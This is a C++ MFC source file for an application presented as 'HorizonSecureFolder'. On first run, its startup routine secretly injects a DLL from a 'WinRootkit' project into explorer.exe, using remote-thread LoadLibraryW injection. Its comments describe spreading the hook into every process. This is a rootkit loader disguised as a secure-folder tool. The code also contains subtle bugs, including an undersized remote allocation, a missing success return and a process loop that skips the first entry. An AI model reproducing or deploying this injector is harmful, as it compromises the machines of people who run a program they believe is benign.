
// HorizonSecureFolder.cpp : Defines the class behaviors for the application.
//

#include "pch.h"
#include "framework.h"
#include "HorizonSecureFolder.h"
#include "HorizonDlg.h"

#include <Psapi.h>
#include <TlHelp32.h>

#ifdef _DEBUG
#define new DEBUG_NEW
#endif


// HorizonApp

BEGIN_MESSAGE_MAP(HorizonApp, CWinApp)
	ON_COMMAND(ID_HELP, &CWinApp::OnHelp)
END_MESSAGE_MAP()


// HorizonApp construction

HorizonApp::HorizonApp()
{

	// TODO: add construction code here,
	// Place all significant initialization in InitInstance
}


// The one and only HorizonApp object

HorizonApp theApp;


BOOL InjectLibrary(CONST PWCHAR ProcessName, CONST PWCHAR LibraryPath);
BOOL InjectLbraryPid(DWORD ProcessPid, CONST PWCHAR LibraryPath);
DWORD GetProcessPid(CONST PWCHAR ProcessName, CONST PWCHAR LibraryPath);
BOOL ModuleAlreadyLoaded(CONST PWCHAR MOD_NAME, DWORD PID);


// HorizonApp initialization

BOOL HorizonApp::InitInstance(){
	INITCOMMONCONTROLSEX InitCtrls;
	InitCtrls.dwSize = sizeof(InitCtrls);

	InitCtrls.dwICC = ICC_WIN95_CLASSES;
	InitCommonControlsEx(&InitCtrls);

	CWinApp::InitInstance();

	AfxEnableControlContainer();

	// Create the shell manager, in case the dialog contains any shell tree view or shell list view controls.
	CShellManager *pShellManager = new CShellManager;

	// Activate "Windows Native" visual manager for enabling themes in MFC controls
	CMFCVisualManager::SetDefaultManager(RUNTIME_CLASS(CMFCVisualManagerWindows));

	SetRegistryKey(_T("HorizonDova"));

	HKEY mKeyHandle;

	LONG result = RegOpenKeyEx(HKEY_CURRENT_USER, _T("Software\\HorizonDova"), 0, KEY_READ, &mKeyHandle);

	if (result != ERROR_SUCCESS) {

		// If this is the first time this process starts

		// Create a new volatile key
		RegCreateKeyEx(HKEY_CURRENT_USER, _T("Software\\HorizonDova"), 0, NULL, REG_OPTION_VOLATILE, KEY_WRITE, NULL, &mKeyHandle, NULL);

		
		// Inject the library into explorer.exe | or any aother running process
		// Fromm explorer.exe start injecting into every process
		// Start the hooking procedure for each one.


		InjectLibrary(_T("explorer.exe"), _T("C:\\Users\\rezni\\source\\repos\\WinRootkit\\x64\\Debug\\LibraryRootkit.dll"));
	}
	else {
		OutputDebugString(_T("ALREADY EXISTS"));
	}




	HorizonDlg dlg;
	m_pMainWnd = &dlg;

	INT_PTR nResponse = dlg.DoModal();


	// Delete the shell manager created above.
	if (pShellManager != nullptr) delete pShellManager;
	

#if !defined(_AFXDLL) && !defined(_AFX_NO_MFC_CONTROLS_IN_DIALOGS)
	ControlBarCleanUp();
#endif

	return FALSE;
}



BOOL ModuleAlreadyLoaded(CONST PWCHAR MOD_NAME, DWORD PID) {
	HMODULE hMods[1024];
	HANDLE hProcess;
	DWORD cbNeeded;
	unsigned int i;

	// Get a handle to the process.

	hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, PID);

	if (NULL == hProcess) return false;

	// Get a list of all the modules in this process.

	if (EnumProcessModules(hProcess, hMods, sizeof(hMods), &cbNeeded))
	{
		for (i = 0; i < (cbNeeded / sizeof(HMODULE)); i++)
		{
			TCHAR szModName[MAX_PATH];

			// Get the full path to the module's file.

			if (GetModuleFileNameEx(hProcess, hMods[i], szModName, sizeof(szModName) / sizeof(TCHAR)))
			{
				// Print the module name and handle value.

				if (wcscmp(szModName, MOD_NAME) == 0) {

					CloseHandle(hProcess);

					return true;
				}
			}
		}
	}

	// Release the handle to the process.

	CloseHandle(hProcess);

	return false;
}


DWORD GetProcessPid(CONST PWCHAR ProcessName, CONST PWCHAR LibraryPath) {
	PROCESSENTRY32 ProcessEntryStruct;
	ProcessEntryStruct.dwSize = sizeof(PROCESSENTRY32);

	HANDLE HelperSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);

	if (HelperSnapshot == INVALID_HANDLE_VALUE)
	{
		return 0;
	}

	if (Process32First(HelperSnapshot, &ProcessEntryStruct))
	{
		while (Process32Next(HelperSnapshot, &ProcessEntryStruct))
			if (wcscmp(ProcessName, ProcessEntryStruct.szExeFile) == 0) {

				// Check for already loaded modules.
				if (ModuleAlreadyLoaded(LibraryPath, ProcessEntryStruct.th32ProcessID)) continue;

				// Why to continue execution though ?
				// Because there could be multiple process with the same name opened.

				// close the handle for the snapshot
				CloseHandle(HelperSnapshot);

				// return the pid
				return ProcessEntryStruct.th32ProcessID;
			}
	}

	// close the handle for the snapshot
	CloseHandle(HelperSnapshot);

	// return an empty pid - ussually specific to system
	return 0;
}


BOOL InjectLbraryPid(DWORD ProcessPid, CONST PWCHAR LibraryPath) {

	// Get a handle to the process
	HANDLE ProcessHandle = OpenProcess(PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | PROCESS_VM_READ | PROCESS_VM_WRITE | PROCESS_VM_OPERATION, 0, ProcessPid);

	// Is a valid handle ?
	if (!ProcessHandle) {
		OutputDebugStringA("OpenProcess failed!");

		return false;
	}

	// Get the handle for the library
	HMODULE Kernel32Lib = GetModuleHandle(_T("kernel32.dll"));

	// check for validity
	if (!Kernel32Lib) {
		OutputDebugStringA("Kernel32 not found!");

		CloseHandle(ProcessHandle);
		return false;
	}

	// Get the address of the LoadLibrary Function inside the library.
	LPVOID LoadLibraryAddress = (LPVOID)GetProcAddress(Kernel32Lib, "LoadLibraryW");

	if (!LoadLibraryAddress) {
		OutputDebugStringA("LoadLibraryW not found!");

		CloseHandle(ProcessHandle);
		return false;
	}

	// Allocate enough memory in a remote process to hold
	// the path of the library to be injected.
	LPVOID RemoteProcessLibPathAddress = VirtualAllocEx(ProcessHandle, NULL, wcslen(LibraryPath) + 1, MEM_COMMIT, PAGE_READWRITE);

	if (!RemoteProcessLibPathAddress) {
		OutputDebugStringA("VirtualAllocEx failed!");

		CloseHandle(ProcessHandle);
		return false;
	}


	// Holds how many bytes of the path was written.
	SIZE_T BytesWritten;

	if (!WriteProcessMemory(ProcessHandle, RemoteProcessLibPathAddress, LibraryPath, wcslen(LibraryPath) + 1, &BytesWritten)) {
		OutputDebugStringA("WriteProcessMemory failed!");

		CloseHandle(ProcessHandle);
		return false;
	}

	// Execute the LoadLibrary Function in the context
	// of the specified process.
	// As the kernel32 and some other libraries are always mapped
	// to the same address in each process, then this call will be succesfull.
	HANDLE RemoteThreadContext = CreateRemoteThreadEx(ProcessHandle, NULL, 0, (LPTHREAD_START_ROUTINE)LoadLibraryAddress, RemoteProcessLibPathAddress, 0, NULL, NULL);

	if (!RemoteThreadContext) {
		OutputDebugStringA("CreateRemoteThreadEx failed!");

		CloseHandle(ProcessHandle);
		return false;
	}

	WaitForSingleObject(RemoteThreadContext, INFINITE);

	VirtualFreeEx(ProcessHandle, RemoteProcessLibPathAddress, wcslen(LibraryPath) + 1, MEM_RELEASE);

	CloseHandle(RemoteThreadContext);

	CloseHandle(ProcessHandle);

	OutputDebugStringA("Succeded!");
}


BOOL InjectLibrary(CONST PWCHAR ProcessName, CONST PWCHAR LibraryPath) {

	// Get the pid of the proces
	DWORD ProcessPid = GetProcessPid(ProcessName, LibraryPath);

	// Is the process active ?
	if (ProcessPid == 0) {
		OutputDebugStringA("Invalid PID!");
		return false;
	}

	return InjectLbraryPid(ProcessPid, LibraryPath);
}


